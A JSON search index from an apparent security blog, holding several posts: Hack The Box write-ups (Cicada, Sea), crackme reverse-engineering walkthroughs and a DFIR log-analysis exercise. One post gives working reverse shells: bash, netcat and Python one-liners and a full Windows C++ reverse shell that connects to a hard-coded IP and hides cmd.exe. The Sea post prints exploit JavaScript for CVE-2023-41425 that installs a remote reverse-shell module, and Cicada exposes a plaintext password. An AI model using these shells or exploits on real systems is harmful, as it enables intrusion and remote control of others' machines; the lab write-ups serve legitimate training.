[
  
  {
    "title": "Cicada - Hack The Box Machines",
    "url": "/posts/Cicada-Hack-The-Box-Machine/",
    "categories": "Hack The Box, Machines",
    "tags": "htb, machine, linux, easy",
    "date": "2024-10-30 08:00:00 +0000",
    





    
    "snippet": "ReconnaisanceHello and welcome back to noob in cybersecurity and today I will show you the way that I solved the Cicada challenge on Hack The BoxTo start tackling the Cicada challenge on Hack The B...",
    "content": "ReconnaisanceHello and welcome back to noob in cybersecurity and today I will show you the way that I solved the Cicada challenge on Hack The BoxTo start tackling the Cicada challenge on Hack The Box, I will focus on reconnaissance and initial footprinting using tools like Nmap. This initial phase sets the foundation for  a successful hack by providing insights into the target’s infrastructure and possible weak points.yzx@machine:~/workspace/hackthebox$ nmap -p- $cicada -T4 --min-rate=2000 -oN cicada/scan -Pn --disable-arp-pingStarting Nmap 7.80 ( https://nmap.org ) at 2024-10-31 11:26 EDTNmap scan report for 10.x.x.xHost is up (0.13s latency).Not shown: 65522 filtered portsPORT      STATE SERVICE53/tcp    open  domain88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPssl5985/tcp  open  wsman57635/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 98.66 secondsecho '10.10.x.x cicada.htb' | sudo tee -a /etc/hostsFrom the  results of the Nmap scan, we can see that the SMB (Server Message Block) share is enabled, which can reveal valuable information when properly explored. To connect to an SMB share, I often use tools like smbclient . To begin the process, I used a command like smbclient -L //cicada.htb -U ‘guest’ to list available shares.yzx@machine:~/workspace/hackthebox$ smbclient -L //cicada.htbPassword for [WORKGROUP\\yzx]:\tSharename       Type      Comment\t---------       ----      -------\tADMIN$          Disk      Remote Admin\tC$              Disk      Default share\tDEV             Disk      \tHR              Disk      \tIPC$            IPC       Remote IPC\tNETLOGON        Disk      Logon server share \tSYSVOL          Disk      Logon server share SMB1 disabled -- no workgroup availableWe can see some sharename such as: DEV , HR, etc …Upon further exploration of the HR directory, I discovered that there is a file named Notice from HR.txt , and to find out the content of this file is, I opened it.$sourceDirectory = \"C:\\smb\"$destinationDirectory = \"D:\\Backup\"$username = \"emily.oscars\"$password = ConvertTo-SecureString \"Q!3@Lp#M6b*7t*Vt\" -AsPlainText -Force$credentials = New-Object System.Management.Automation.PSCredential($username, $password)$dateStamp = Get-Date -Format \"yyyyMMdd_HHmmss\"$backupFileName = \"smb_backup_$dateStamp.zip\"$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileNameCompress-Archive -Path $sourceDirectory -DestinationPath $backupFilePathWrite-Host \"Backup completed successfully. Backup file saved to: $backupFilePath\""
  },
  
  {
    "title": "baby's first crackme - Crackmes One",
    "url": "/posts/baby's-first-crackme/",
    "categories": "Crackmes, Unix/linux etc.",
    "tags": "Crackmes, Reverse, C/C++, Linux, GDB, Ghidra",
    "date": "2024-09-19 08:00:00 +0100",
    





    
    "snippet": "Description: I made it with a certain password (you would know it if you get it), but there are many passwords that workCheck fileSimilar to other challenges, for this challenge, I was also provide...",
    "content": "Description: I made it with a certain password (you would know it if you get it), but there are many passwords that workCheck fileSimilar to other challenges, for this challenge, I was also provided with a zip file. Unzip this file reveals an executable named rust_1.AnalysisOpen this file with GDB for debugging and we can see the programs have functions such as: main, check_key, and encode_input.This code sets up stack frame: sub rsp, 0x20 -&gt; decreases the value of $rsp by 32 bytes to allocate space for the local variables of the function.Take the values of the register eid and rsi and assign them to the memory locations [rbp-0x14] and [rbp-0x20], respectively.Next, compare the value at [rbp-0x14] (which holds the value of edi, typically the first parameter, argc from the main function) with 0x2.  0x00000000000013b8 &lt;+0&gt;:\tendbr64  0x00000000000013bc &lt;+4&gt;:\tpush   rbp  0x00000000000013bd &lt;+5&gt;:\tmov    rbp,rsp  0x00000000000013c0 &lt;+8&gt;:\tsub    rsp,0x20  0x00000000000013c4 &lt;+12&gt;:\tmov    DWORD PTR [rbp-0x14],edi  0x00000000000013c7 &lt;+15&gt;:\tmov    QWORD PTR [rbp-0x20],rsi  0x00000000000013cb &lt;+19&gt;:\tcmp    DWORD PTR [rbp-0x14],0x2  0x00000000000013cf &lt;+23&gt;:\tjg     0x13ea &lt;main+50&gt;So, when running the program, at least two parameters must be provided; otherwise, it will jump to the code below.In this code segment, it’ll call the put function to print a string located at [rip+0xc50], and return.Therefore, to run this program, I need to provide two input parameters: key and number.In the next code segment, the program retrieves the values of key and number.As we analyze, the parameter char** argv of the main function is stored at [rbp-0x20], which points to 0x7fffffffdc50. This address contains the value 0x7fffffffdd88 -&gt; 0x7fffffffe126 (the path of the program).The value at $rax + 8 equals 0x7fffffffdd88 + 8 = 0x7fffffffdd90, where 0x7fffffffdd90 holds the value 0x7fffffffe14f, pointing to the key string we provided, or argv[1].Similarly, the position at [rbp-0x20] + 0x10 corresponds to argv[2], which is the number.The program then calls the atoi function to convert the number from a string to an integer.Next, the program calls the strlen function to calculate the length of the key string and compares it with 0xc. If they are equal, it jumps to main+129.In this segment, the program checks if the value of number is greater than 0 and less than 0x32 (50).The js instruction is conditional jump that will jump to a specified address if the sign flag (SF) in the EFLAGS register is set. The SF flag is set by arithmetic instruction, such as sub, when the result is a negative number.The strcspn function finds the first occurrence of any character in key that is not a newline character \\n.After finding the first position in key that does not contain a newline character (\\n), the program will assign a null terminator (\\0) at that position. At this point, the values of key and number are passed as parameters to the check_key function.At this point, I’m quite lazy to analyze the assembly, so let’s switch to analyzing the pseudocode in Ghidra for a quicker understanding.In the check_key function, it can be seen that the encode_input function is called with three parameters: param_1, param_2, and local_58. The encode_input function performs some calculations and stores the returned result in local_58.Next is an infinite while loop that iterates through the characters in local_58 and stores the last character in local_64.An if statement checks if the value of the variable local_64 is equal to 0x7c (which is the pipe character |). If true, it prints “Access granted”; otherwise, it prints “Access denied!”.void check_key(undefined8 param_1,undefined4 param_2){  size_t sVar1;  long in_FS_OFFSET;  int local_64;  int local_60;  char local_58 [56];  long local_20;    local_20 = *(long *)(in_FS_OFFSET + 0x28);  encode_input(param_1,param_2,local_58);  local_60 = 0;  while( true ) {    sVar1 = strlen(local_58);    if (sVar1 &lt;= (ulong)(long)local_60) break;    local_64 = (int)local_58[local_60];    local_60 = local_60 + 1;  }  if (local_64 == 0x7c) {    puts(\"Access granted!\");  }  else {    puts(\"Access denied!\");  }  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {                    /* WARNING: Subroutine does not return */    __stack_chk_fail();  }  return;}As analyzed in the check_key function, we can pass any values for the parameters key and number as long as they meet the following criteria:  The key has a length of 12 characters.  The number is within the range (0-50].  The last character of the result returned by the encode_input function must be |.After understanding the operation of the check_key function, I will look at the encode_input function to see how it works.This function operates as follows:  It iterates through the key string until it encounters a null character (\\0).  It checks whether the index of that character in the key string is even or odd.  It then checks the character’s ASCII value to determine if it is even or odd, performing corresponding calculations.void encode_input(long param_1,char param_2,long param_3){  uint local_c;    for (local_c = 0; *(char *)(param_1 + (int)local_c) != '\\0'; local_c = local_c + 1) {    if ((local_c &amp; 1) == 0) {      if ((*(byte *)(param_1 + (int)local_c) &amp; 1) == 0) {        *(char *)(param_3 + (int)local_c) = *(char *)(param_1 + (int)local_c) - param_2;      }      else {        *(char *)(param_3 + (int)local_c) = *(char *)(param_1 + (int)local_c) + param_2;      }    }    else if ((*(byte *)(param_1 + (int)local_c) &amp; 1) == 0) {      *(char *)(param_3 + (int)local_c) = *(char *)(param_1 + (int)local_c) + param_2 * '\\x02';    }    else {      *(char *)(param_3 + (int)local_c) = *(char *)(param_1 + (int)local_c) + param_2 * -2;    }  }  *(undefined *)(param_3 + (int)local_c) = 0;  return;}     def encode_input (key: str, num: int) -&gt; str:    buffer = []    for local_c in range(len(key)):        if (local_c &amp; 1) == 0:             if (ord(key[local_c])&amp;1) == 0:                 buffer.append(chr(ord(key[local_c]) - num))            else:                 buffer.append(chr(ord(key[local_c]) + num))        else:             if (ord(key[local_c]) &amp; 1) == 0:                buffer.append(chr(ord(key[local_c]) + num * 0x2))            else:                buffer.append(chr(ord(key[local_c]) + num * (-0x2)))                    return ''.join(buffer)This task is quite easy; there’s no need to overthink it and make it complicated. The only thing to pay attention to is ensuring that the last character in the key (the 11th character) encodes to the pipe character |, and that this character is either even or odd in decimal form. The other characters can be anything, as long as they are not special characters.Okay, so I have a snippet of code that generates valid key and number inputs. However, it needs to exclude any special characters. !Thanksdef get_key_num():    key = 11 * 'x'    for i in range (15,128):        if i &amp; 1 == 0:            num = (0x7c-i)//2            if num &gt; 0 and num &lt; 0x32:                 print('{}{} - {}'.format(key, chr(i), num))        else:             num = (i-0x7c)//2            if num &gt; 0 and num &lt; 0x32:                 print('{}{} - {}'.format(key, chr(i), num))At this point, we can conclude the challenge. However, I just remembered a case: if I run the program like this ./rust_1 zzzz\\nzzzzzzz 2, this string for key and number is correct, and the program prints “Access granted”However, the key string contains the \\n character, so why does it still work according to the principle I mentioned, where only the last character in the key and the number need to encode to |?The reason for this is that the shell (bash or zsh) does not interpret \\n as a newline here; instead, it understands \\ as an escape character. Since n is not a special character, it remains unescaped, resulting in the input string being zzzznzzzzzzz.That’s on!"
  },
  
  {
    "title": "Level Keygen - Crackmes One",
    "url": "/posts/Level-keygen-crackmesone/",
    "categories": "Crackmes, Unix/linux etc.",
    "tags": "Crackmes, Reverse, C/C++, Linux, GDB, Ghidra",
    "date": "2024-09-15 08:00:00 +0100",
    





    
    "snippet": "Description: Lots of puts and printf… for people who want a way to progress from level 1 to level 2 and better understand there decompiler framework. If you want the original source code i mightt p...",
    "content": "Description: Lots of puts and printf… for people who want a way to progress from level 1 to level 2 and better understand there decompiler framework. If you want the original source code i mightt post it in a day or 2. You are restricted from patching until the bonus stage.Checking the fileHello you guys, welcome back to another challenge with n00b in cybersecurity. Today, I’ll be presenting one of the crackme challenges called Level Keygen.$ file LevelsByMacaroni841  LevelsByMacaroni841: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e7e1ccd9e8817a0184ad4cfd39ed300a5d8f7d94, for GNU/Linux 3.2.0, not strippedDebuging with GDBSince this program is not stripped, I can use a debugger tool to examine and step through its code.First, I used the info func command to check what functions are in this program.Let’s look at the first lines of the main function. In this code, it sets up the stack frame, prepares parameters for the printf function, and calls printf, which will print the string 'Enter a string: '   0x00000000000011c9 &lt;+0&gt;:\tendbr64   0x00000000000011cd &lt;+4&gt;:\tpush   rbp   0x00000000000011ce &lt;+5&gt;:\tmov    rbp,rsp   0x00000000000011d1 &lt;+8&gt;:\tsub    rsp,0x70   0x00000000000011d5 &lt;+12&gt;:\tlea    rax,[rip+0xe2c]        # 0x2008   0x00000000000011dc &lt;+19&gt;:\tmov    rdi,rax   0x00000000000011df &lt;+22&gt;:\tmov    eax,0x0   0x00000000000011e4 &lt;+27&gt;:\tcall   0x10b0 &lt;printf@plt&gt;Next, it loads the address of the fgets function from libc, executes the fgets call to get the input, and stores it in the memory location [rbp-0x40]. Here, fgets will read up to 40 (0x28) characters.   0x00000000000011e9 &lt;+32&gt;:\tmov    rdx,QWORD PTR [rip+0x2e20]        # 0x4010 &lt;stdin@GLIBC_2.2.5&gt;   0x00000000000011f0 &lt;+39&gt;:\tlea    rax,[rbp-0x40]   0x00000000000011f4 &lt;+43&gt;:\tmov    esi,0x28   0x00000000000011f9 &lt;+48&gt;:\tmov    rdi,rax   0x00000000000011fc &lt;+51&gt;:\tcall   0x10c0 &lt;fgets@plt&gt;At this point, I entered a string. This string is stored at [rbp-0x40], so when I use the x/s command, it’ll display the string I entered.Next, the program will call the strlen function to calculate the length of the string you entered.The value returned by the strlen function is stored in the rax register. The length of the string you entered is 8, and this includes the newline character (\\n) that is added when you press Enter.After getting the string length, the program calls cmp to compare the length with 6. If the length is not equal to 6, it jumps to the address main+589 and prints the string \"FAILURE-LVL-1: how long is your string? Do you know what a NULL terminator is?\"To pass level 1, the input string must be exactly 5 characters long.In this step, I need to change the value of $rax in order to bypass the cmp instruction. set $rax=0x6The message ‘Level 1 Pass: String length is correct’ will be printed if we enter a string with the correct length, specifically 6 characters.Next, it will take one byte from the memory location [rbp-0x3f] and compare it with the value 0x34.As analyzed above, the string we input is stored at [rbp-0x40], so the location [rbp-0x3f] is actually the first byte of the string we entered.Next, set the value of $rax to 0x34 in order to pass the cmp instruction.Next, compare whether the value of the byte at position 0 is equal to 0x33.Okay, so you’ve passed level 2.5. Next, the following string will be printed: ‘You will be prompted to enter a second key….. I know. Annoyyyingggg.’Next, enter the second string. Similar to the first string, after entering it, the length of the string is checked and compared with the value at [rbp-8], which is the length of the first string. Thus, the second string must also be 6 characters long, and the string you enter is stored at [rbp-0x70].In this section, there is a loop from [0-4]  to compare each byte in the two strings. Analyzing this code, you can see that the character in s2[index] - 0x30 should equal (s1[index] - 0x30) * 2. Therefore, you can choose characters starting from 0 onward, because each byte should be subtracted by 0x30 (the position of the character 0 in the ASCII table) to meet the condition. Also, avoid choosing characters from a onward for the first string because selecting such characters for the second string will result in characters in the extended ASCII codes (&gt;127). To simplify, I will choose the remaining 3 characters (since the first 2 characters must be 34) in the first string as 0, so there’s no need to think about selecting characters that satisfy the condition for the second string.So, we can pass the levels, but there’s still one final challenge, here:In this part, scanf is used to input some value, and then it compares the value at [rbp-8] with 0x1b39 to determine whether to print the next string.As analyzed earlier, the value at [rbp-8] represents the length of the string we entered, which is 6. Therefore, you need to change the value 0x1b39 to 0x6.Final.This is a piece of code in the main function decompiled by Ghidra. You can immediately see the flow of the program, but since this is an easy challenge, I want to use GDB to execute it step by step to understand the assembly code as well as how to use GDB for debugging. !Thanksundefined8 main(void){  size_t sVar1;  char local_78 [48];  char local_48 [52];  int local_14;  int local_10;  int local_c;    printf(\"Enter a string: \");  fgets(local_48,0x28,stdin);  sVar1 = strlen(local_48);  local_10 = (int)sVar1;  if (local_10 == 6) {    puts(\"\\n\\n\\nLevel 1 Pass: String length is correct\\n\\n\");    if (local_48[1] == '4') {      puts(\"Level 2 Pass: the character is as expectedd\\n\\n\");      if (local_48[0] == '3') {        puts(\"Level 2.5 Pass: You understand the requirement\\n\\n\");        puts(\"you will be prompted to enter a second key..... I know. Annnnoyyyingggg\");        puts(            \"The first key and the second key have a certain relationship figure this out to pass\\n\\ n\"            );        printf(\"Enter string #2: \");        fgets(local_78,0x28,stdin);        sVar1 = strlen(local_78);        local_14 = (int)sVar1;        if (local_14 == local_10) {          for (local_c = 0; local_c &lt; 5; local_c = local_c + 1) {            if (local_78[local_c] + -0x30 != (local_48[local_c] + -0x30) * 2) {              puts(                  \"FAILURE-LVL-2-Look through the logic in a ghidra or something Im sure youll under stand it then\"                  );              break;            }          }          puts(\"SUCCESS-LVL-3: You Did it! i hope you learned something.\\n\\n\");          puts(              \"**i pray for the day crackmes.one adds a section for hints that the author can add**\\ n\"              );          puts(              \"If you havent done it before this will be a little bonus section for binary patching\"              );          puts(              \"For the bonus section you need to modify the binary to bypass an impossible if statem ent\"              );          puts(\"When ready type a letter then press enter to go into the statement: \");          __isoc99_scanf(&amp;DAT_00102365);          if (local_10 == 6) {            puts(\"SUCCESS-LVL-BONUS: Well damn you did it\");            puts(\"Should I make more of these?\");            puts(                \"Probably not with the yanderedev if statement spam and 7 million calls to printf, b ut ill work on it\"                );            puts(\"Bye! - saltedMacaroni841\");          }          else {            puts(\"FAILURE-LVL-BONUS: Forcing you to type all that crap again i know.. cruel\");            puts(\"Cutter is actually pretty good for this\");            puts(\"Wowza! https://www.megabeets.net/5-ways-to-patch-binaries-with-cutter/\");          }        }        else {          puts(\"The string length has to be the same\");        }      }      else {        puts(\"I think if requires another character in another certain position?\");      }    }    else {      puts(          \"FAILURE-LVL-2: Maybe the program wants a certain character in a certain position to proce ed?\\n\\n\"          );    }  }  else {    puts(\"FAILURE-LVL-1: how long is your string? Do you know what a NULL terminator is?.\");  }  return 0;}Done!"
  },
  
  {
    "title": "CrownJewel 2 - Sherlocks",
    "url": "/posts/CrownJewel2-Hack-The-Box-Challenges/",
    "categories": "Hack The Box, Sherlocks",
    "tags": "htb, challenge, sherlocks, NTDS, Windows Event, DFIR",
    "date": "2024-09-14 08:00:00 +0100",
    





    
    "snippet": "Scenario: Forela’s Domain environment is pure chaos. Just got another alert from the Domain controller of NTDS.dit database being exfiltrated. Just one day prior you responded to an alert on the sa...",
    "content": "Scenario: Forela’s Domain environment is pure chaos. Just got another alert from the Domain controller of NTDS.dit database being exfiltrated. Just one day prior you responded to an alert on the same domain controller where an attacker dumped NTDS.dit via vssadmin utility. However, you managed to delete the dumped files kick the attacker out of the DC, and restore a clean snapshot. Now they again managed to access DC with a domain admin account with their persistent access in the environment. This time they are abusing ntdsutil to dump the database. Help Forela in these chaotic times!!Task 1At the start of the challenge, I will be given a zip file named crownjewel2.zip. When I unzip this file, I will obtain three event log files: APPLICATION, SECURITY, and SYSTEM logs.I used Evtxcmd tool to parse the event log into CSV file.PS: ⥑01:41:00⥏ ∺ ﹝Hunting﹞ ▹ evtxECmd.exe -d .\\Artifacts\\ --csv crownjewel2According to the information in question 1, when using ntdsutil.exe to dump the NTDS (Active Directory) database to disk, it also uses the Microsoft Shadow Copy Service.System logs in Windows provide information about service-related events (stoped, started, restarted). Filter for Event ID 7036 which mean   DescriptionService started or stopped and look for Microsoft Shadow Copy ServiceAnswer: 2024-05-15 05:39:55Task 2As we already know that Shadow Copy service will enter running state before NTDS file was dumped so we can filter for Event ID 325 (The database engine created a new database) and 327 (The database engine detached a database)In Application Event Log, filter for Event ID 325. This Event ID is recorded whenever a new database (new copy of NTDS.dit database) is created by the database engine and will logged location of a new file so you can get the full path of the dumped NTDS file.Answer: C:\\Windows\\Temp\\dump_tmp\\Active Directory\\ntds.ditTask 3This would be the time of the same event when the NTDS file was dumped (Event ID 325), so you should look at the creation time and use this time for the answer.Answer: 2024-05-15 05:39:56Task 4As I mentioned in the previous task, Event ID 325 indicates that NTDS the database engine created a new database, while Event ID 327 indicates that NTDS the database engine detached a database.In the Application Event Log, filter for Event ID 327, which indicates when a newly created database is detached by the database engine and marked as ready to use.Answer: 2024-05-15 05:39:58Task 5Event logs use event sources to track events coming from different sources and you can see Event ID 325, 327 came from the same source which is ESENTAnswer: ESENTTask 6When ntdsutil.exe is used to dump the database, it enumerates certain user groups to validate the privileges of the account being used.So, I need to open Security log for this task, filter for Event ID 4799 (A security-enabled local group membership was enumerated) and look for Events in between the timeframe of incident identified so far.Answer: Administrators, Backup Operators, 0x8DE3DTask 7In this task, you can take the LoginID 0x8DE3D in the previous task and go to the Security logs as those login/logout events of users.Initially, I thought I had to search for Event ID 4624 to find successful user logons to the system, but I did not find any Event ID 4624 entries.Since this is a domain environment, I must to find Kerberos Events such as 4768 and 4769. From here identify the Event Where Account Name is a user account name and not any service or machine account (Starting with a $) in the event 4768Answer: 2024-05-15 05:36:31References[1] - NTDS dumping attack detection[2] - Event types in Windows Event Log[3] - Complete Guide to Checking Window Logs[4] - 4799(S): A security-enabled local group membership was enumerated"
  },
  
  {
    "title": "Simple Reverse Shell with C++",
    "url": "/posts/Reverse-Shell-with-C++/",
    "categories": "Blogs, Knowledge",
    "tags": "c++, reverse shell, winsock2",
    "date": "2024-08-26 08:00:00 +0100",
    





    
    "snippet": "What is Reverse Shell?Reverse shell or often called connect-back shell is remote shell introduced from the target by connecting back to the attacker machine and spawning target shell on the attacke...",
    "content": "What is Reverse Shell?Reverse shell or often called connect-back shell is remote shell introduced from the target by connecting back to the attacker machine and spawning target shell on the attacker machine. This usually used during exploitation process to gain control of  the remote machine.A reverse shell is commonly used to bypass firewall restrictions that block incoming connections.The target machine has a firewall that blocks incoming connections on most ports, but it may allow outbound connection.There is one more caveat. In real cyber attacks, the reverse shell can also be obtained through social engineering, for example, a piece of malware installed on a local workstation via a phishing email or a malicious website might initiate an outgoing connection to a command server and provide hackers with a reverse shell capability.Simple Reverse ShellFirst, set up a listener on your server. For simplicity, in this example, the victim allows outgoing connections on any port. In this case, use 9001 as the listener port.The listener can be any program or utility capable  of opening TCP/UDP connections or sockets, nc or netcat can be used for this purpose.nc -lnvp 9001bash -c 'sh -i &gt;&amp; /dev/tcp/&lt;ip addr&gt;/9001 0&gt;&amp;1'This is a simple reverse shell in Bash. You can create a reverse shell with a semi-interactive shell using Python, as well as with other languages such as C/C++, PHP, etc.mkfifo /tmp/p; nc &lt;LHOST&gt; &lt;LPORT&gt; 0&lt;/tmp/p | /bin/sh &gt; /tmp/p 2&gt;&amp;1; rm /tmp/ppython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"&lt;LHOST&gt;\",&lt;LPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'Simple Reverse Shell with C++ for Windows#ifndef WIN32_LEAN_AND_MEAN#define WIN32_LEAN_AND_MEAN#endif // !WIN32_LEAN_AND_MEAN#include&lt;Windows.h&gt;#include&lt;WinSock2.h&gt;#include&lt;WS2tcpip.h&gt;#include&lt;stdio.h&gt;#pragma comment(lib, \"Ws2_32.lib\")#define EXIT_SUCCESS 0#define EXIT_FAILED 1 int main(){\tBYTE lowByte = 0x02; \tBYTE highByte = 0x02; \tWORD wVersionRequested = MAKEWORD(lowByte, highByte); \t// Initialize winsock\tWSADATA wsaData; \tint err = WSAStartup(wVersionRequested, &amp;wsaData); \tif (err != 0)\t{#ifdef DEBUG\t\tprintf(\"WSAStartup failed with error: %d\\n\", err); #endif // DEBUG\t\treturn EXIT_FAILED; \t}\t// Create socket\tSOCKET s = INVALID_SOCKET; \ts = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); \tif (s == INVALID_SOCKET)\t{#ifdef DEBUG\t\tprintf(\"WSASocket function failed with error: %ld\\n\", WSAGetLastError());#endif // DEBUG\t\treturn EXIT_FAILED;\t}\tstruct sockaddr_in serverAdrdr; \tZeroMemory(&amp;serverAdrdr, sizeof(serverAdrdr)); \tserverAdrdr.sin_family = AF_INET; \tserverAdrdr.sin_port = htons(443); \tinet_pton(AF_INET, \"107.20.10.75\", &amp;serverAdrdr.sin_addr);\t// Connect to server\tif (WSAConnect(s, (struct sockaddr*)&amp;serverAdrdr, sizeof(serverAdrdr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)\t{#ifdef DEBUG\t\tprintf(\"Socket connection error: %ld\\n\", WSAGetLastError());#endif // DEBUG\t\tclosesocket(s);\t\tWSACleanup();\t\treturn EXIT_FAILED;\t}\t// Create process\tchar buffer[4096];\tSTARTUPINFOA si{};\tPROCESS_INFORMATION pi{};\twhile (true)\t{\t\tint receivedBytes = recv(s, buffer, sizeof(buffer), 0); \t\tif (receivedBytes &lt;= 0)\t\t{#ifdef DEBUG\t\t\tprintf(\"Connection closed.\\n\");#endif // DEBUG\t\t}\t\telse\t\t{#ifdef DEBUG\t\t\tprintf(\"recv failed: %d\\n\", WSAGetLastError());#endif // DEBUG\t\t}\t\t// Set up STARTUPINFO\t\tSecureZeroMemory(&amp;si, sizeof(si));\t\tsi.cb = sizeof(si); \t\tsi.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \t\tsi.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;\t\tsi.wShowWindow = SW_HIDE;\t\tchar kommand[] = \"cmd.exe\";\t\tif (!CreateProcessA(NULL, kommand, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi))\t\t{#ifdef DEBUG\t\t\tprintf(\"CreateProcess failed: %d\\n\", GetLastError()); #endif // DEBUG\t\t\tbreak;\t\t}\t\tWaitForSingleObject(pi.hProcess, INFINITE);\t\tCloseHandle(pi.hProcess); \t\tCloseHandle(pi.hThread); \t}\tclosesocket(s);\t// Call WSACleanup when done using the winsock dll\tWSACleanup(); \treturn EXIT_SUCCESS;}References[1] - Reverse Shell cheatsheet - PayloadsAllTheThings [2] - cocomelonc - Simple C++ reverse shell for windows"
  },
  
  {
    "title": "Sea - Hack The Box Machines",
    "url": "/posts/Sea-Hack-The-Box-Machine/",
    "categories": "Hack The Box, Machines",
    "tags": "htb, machine, web, sea, seasonvi, wondercms",
    "date": "2024-08-16 08:00:00 +0100",
    





    
    "snippet": "ReconnaisanceHello, you guys! 👋 Welcome back. This is the second machine challenge of Season VI. As with many previous attempts to pwn a box, I will start off by scanning the IP address to see what...",
    "content": "ReconnaisanceHello, you guys! 👋 Welcome back. This is the second machine challenge of Season VI. As with many previous attempts to pwn a box, I will start off by scanning the IP address to see what ports are open. Let’s do it with NMAP tool:$ nmap -p- 10.10.x.x --min-rate=1000 -T4 -oN nmapscan -Pn --disable-arp-pingStarting Nmap 7.80 ( https://nmap.org ) at 2024-08-17 06:59 CESTWarning: 10.10.x.x giving up on port because retransmission cap hit (6).Nmap scan report for sea.htb (10.10.x.x)Host is up (0.027s latency).Not shown: 64391 closed ports, 1142 filtered portsPORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 107.97 seconds$ ports=$(cat nmapscan | grep -E '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)$ nmap -p$ports 10.10.x.xStarting Nmap 7.80 ( https://nmap.org ) at 2024-08-17 07:39 CESTNmap scan report for sea.htb (10.10.x.x)Host is up (0.023s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Sea - HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.71 secondsAnd I got two ports open 22 for SSH and 80 for HTTP. I need to add the IP address of the machine to my hosts file:echo '10.10.1x.x sea.htb' | sudo tee -a  /etc/hostsNext, lets go and visit http://sea.htb:Well, the homepage didn’t have anything interesting, but I found the contact form when I clicked on How to Practice.The first thing that comes up in my mine when I saw input field is XSS or SQLi, or SSRF in website field, but it didn’t work.I tried to find sub-directories with ffuf:$ ffuf -u http://sea.htb/FUZZ -w ~/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt -fs 199        /'___\\  /'___\\           /'___\\              /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/              \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\              \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/               \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                 \\/_/    \\/_/   \\/___/    \\/_/              v1.1.0________________________________________________ :: Method           : GET :: URL              : http://sea.htb/FUZZ :: Wordlist         : FUZZ: /home/natsu/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403 :: Filter           : Response size: 199________________________________________________data                    [Status: 301, Size: 228, Words: 14, Lines: 8]home                    [Status: 200, Size: 3649, Words: 582, Lines: 87]404                     [Status: 200, Size: 3340, Words: 530, Lines: 85]messages                [Status: 301, Size: 232, Words: 14, Lines: 8]plugins                 [Status: 301, Size: 231, Words: 14, Lines: 8]themes                  [Status: 301, Size: 230, Words: 14, Lines: 8]0                       [Status: 200, Size: 3649, Words: 582, Lines: 87]                        [Status: 200, Size: 3649, Words: 582, Lines: 87]$ ffuf -u http://sea.htb/themes/FUZZ -w ~/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt -fs 199        /'___\\  /'___\\           /'___\\              /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/              \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\              \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/               \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\                 \\/_/    \\/_/   \\/___/    \\/_/              v1.1.0________________________________________________ :: Method           : GET :: URL              : http://sea.htb/themes/FUZZ :: Wordlist         : FUZZ: /home/natsu/workspace/machine/SecLists-master/Discovery/Web-Content/combined_directories.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403 :: Filter           : Response size: 199________________________________________________home                    [Status: 200, Size: 3649, Words: 582, Lines: 87]404                     [Status: 200, Size: 3340, Words: 530, Lines: 85]bike                    [Status: 301, Size: 235, Words: 14, Lines: 8]Gain access www-dataI already got the exploit: CVE-2023-41425var url = \"http://sea.htb/index.php/?page=loginURL\";if (url.endsWith(\"/\")) { url = url.slice(0, -1);}var urlWithoutLog = url.split(\"/\").slice(0, -1).join(\"/\");var urlWithoutLogBase = new URL(urlWithoutLog).pathname; var token = document.querySelectorAll('[name=\"token\"]')[0].value;var urlRev = \"http://sea.htb/index.php\"+\"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&amp;directoryName=violet&amp;type=themes&amp;token=\" + token;var xhr3 = new XMLHttpRequest();xhr3.withCredentials = true;xhr3.open(\"GET\", urlRev);xhr3.send();xhr3.onload = function() { if (xhr3.status == 200) {   var xhr4 = new XMLHttpRequest();   xhr4.withCredentials = true;   xhr4.open(\"GET\", 